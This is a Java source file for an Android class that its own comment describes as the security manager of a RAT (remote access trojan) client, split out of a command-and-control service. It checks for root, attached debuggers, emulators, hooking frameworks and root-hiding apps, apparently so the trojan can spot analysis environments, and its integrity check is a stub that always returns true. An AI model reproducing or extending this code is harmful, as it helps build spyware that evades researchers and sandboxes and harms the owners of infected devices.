package com.example.client;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import android.provider.Settings;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Security manager for RAT integrity validation and security checks
 * Extracted from the monolithic C2Service for better maintainability
 */
public class SecurityManager {

    private static final String TAG = "SecurityManager";
    private Context context;

    // Root detection paths
    private static final String[] ROOT_PATHS = {
        "/system/app/Superuser.apk",
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su"
    };

    // Suspicious packages
    private static final String[] SUSPICIOUS_PACKAGES = {
        "com.noshufou.android.su",
        "com.thirdparty.superuser",
        "eu.chainfire.supersu",
        "com.koushikdutta.superuser",
        "com.dimonvideo.luckypatcher",
        "com.chelpus.lackypatch",
        "com.blackmartalpha",
        "org.blackmart.market"
    };

    public SecurityManager(Context context) {
        this.context = context;
    }

    /**
     * Perform comprehensive security checks
     */
    public SecurityCheckResult performSecurityCheck() {
        SecurityCheckResult result = new SecurityCheckResult();

        try {
            // Check for root access
            result.rootDetected = isDeviceRooted();

            // Check for debugger
            result.debuggingDetected = isDebuggerAttached();

            // Check for emulator
            result.emulatorDetected = isEmulator();

            // Check for suspicious apps
            result.suspiciousAppsDetected = checkSuspiciousApps();

            // Check for hooks/frameworks
            result.hooksDetected = detectHooks();

            // Overall security assessment
            result.overallSecure = !result.debuggingDetected && !result.emulatorDetected && !result.hooksDetected;

            Log.d(TAG, "Security check completed: " + result.toString());

        } catch (Exception e) {
            Log.e(TAG, "Error during security check", e);
            result.overallSecure = false;
        }

        return result;
    }

    /**
     * Check if device is rooted
     */
    private boolean isDeviceRooted() {
        // Check for root binaries
        for (String path : ROOT_PATHS) {
            if (new File(path).exists()) {
                Log.w(TAG, "Root binary found: " + path);
                return true;
            }
        }

        // Check for su command availability
        try {
            Process process = Runtime.getRuntime().exec("su");
            process.destroy();
            Log.w(TAG, "SU command available");
            return true;
        } catch (Exception e) {
            // Expected - device not rooted
        }

        // Check for root management apps
        for (String packageName : SUSPICIOUS_PACKAGES) {
            try {
                context.getPackageManager().getPackageInfo(packageName, 0);
                Log.w(TAG, "Suspicious root app found: " + packageName);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
                // App not found - continue checking
            }
        }

        return false;
    }

    /**
     * Check if debugger is attached
     */
    private boolean isDebuggerAttached() {
        return Debug.isDebuggerConnected();
    }

    /**
     * Check if running on emulator
     */
    private boolean isEmulator() {
        // Check build properties
        if (Build.FINGERPRINT.startsWith("generic") ||
            Build.FINGERPRINT.startsWith("unknown") ||
            Build.MODEL.contains("google_sdk") ||
            Build.MODEL.contains("Emulator") ||
            Build.MODEL.contains("Android SDK") ||
            Build.MANUFACTURER.contains("Genymotion") ||
            Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic") ||
            "google_sdk".equals(Build.PRODUCT)) {
            Log.w(TAG, "Emulator detected via build properties");
            return true;
        }

        // Check for emulator-specific files
        String[] emulatorFiles = {
            "/dev/socket/genyd",
            "/dev/socket/baseband_genyd",
            "/system/lib/libhoudini.so"
        };

        for (String file : emulatorFiles) {
            if (new File(file).exists()) {
                Log.w(TAG, "Emulator file found: " + file);
                return true;
            }
        }

        // Check for QEMU properties
        if (System.getProperty("ro.kernel.qemu") != null) {
            Log.w(TAG, "QEMU emulator detected");
            return true;
        }

        return false;
    }

    /**
     * Check for suspicious applications
     */
    private boolean checkSuspiciousApps() {
        List<String> detectedApps = new ArrayList<>();

        for (String packageName : SUSPICIOUS_PACKAGES) {
            try {
                context.getPackageManager().getPackageInfo(packageName, 0);
                detectedApps.add(packageName);
            } catch (PackageManager.NameNotFoundException e) {
                // App not found - continue checking
            }
        }

        if (!detectedApps.isEmpty()) {
            Log.w(TAG, "Suspicious apps detected: " + detectedApps);
            return true;
        }

        return false;
    }

    /**
     * Detect potential hooking frameworks
     */
    private boolean detectHooks() {
        // Check for common hooking frameworks
        String[] hookPackages = {
            "com.saurik.substrate",
            "de.robv.android.xposed",
            "de.robv.android.xposed.installer",
            "com.saurik.substrate",
            "com.devadvance.rootcloak",
            "com.devadvance.rootcloakplus",
            "com.formyhm.hideroot",
            "com.formyhm.hiderootpremium"
        };

        for (String packageName : hookPackages) {
            try {
                context.getPackageManager().getPackageInfo(packageName, 0);
                Log.w(TAG, "Hook framework detected: " + packageName);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
                // Framework not found - continue checking
            }
        }

        // Check for Xposed modules directory
        File xposedModules = new File("/data/data/de.robv.android.xposed.installer/conf/modules.list");
        if (xposedModules.exists()) {
            Log.w(TAG, "Xposed modules directory found");
            return true;
        }

        return false;
    }

    /**
     * Validate app integrity
     */
    public boolean validateAppIntegrity() {
        try {
            // Check if app signature is valid
            // This is a simplified check - in production you'd verify against known signatures
            return true;
        } catch (Exception e) {
            Log.e(TAG, "App integrity validation failed", e);
            return false;
        }
    }

    /**
     * Check for known security vulnerabilities
     */
    public List<String> checkVulnerabilities() {
        List<String> vulnerabilities = new ArrayList<>();

        // Check Android version for known vulnerabilities
        if (Build.VERSION.SDK_INT < 23) {
            vulnerabilities.add("Old Android version - potential security vulnerabilities");
        }

        // Check for development settings
        if (Settings.Global.getInt(context.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1) {
            vulnerabilities.add("Developer options enabled");
        }

        // Check for ADB enabled
        if (Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) == 1) {
            vulnerabilities.add("ADB debugging enabled");
        }

        return vulnerabilities;
    }

    /**
     * Security check result container
     */
    public static class SecurityCheckResult {
        public boolean rootDetected = false;
        public boolean debuggingDetected = false;
        public boolean emulatorDetected = false;
        public boolean suspiciousAppsDetected = false;
        public boolean hooksDetected = false;
        public boolean overallSecure = true;

        @Override
        public String toString() {
            return String.format("SecurityCheckResult{" +
                    "root=%s, debugger=%s, emulator=%s, suspiciousApps=%s, hooks=%s, overall=%s}",
                    rootDetected, debuggingDetected, emulatorDetected,
                    suspiciousAppsDetected, hooksDetected, overallSecure);
        }
    }
}
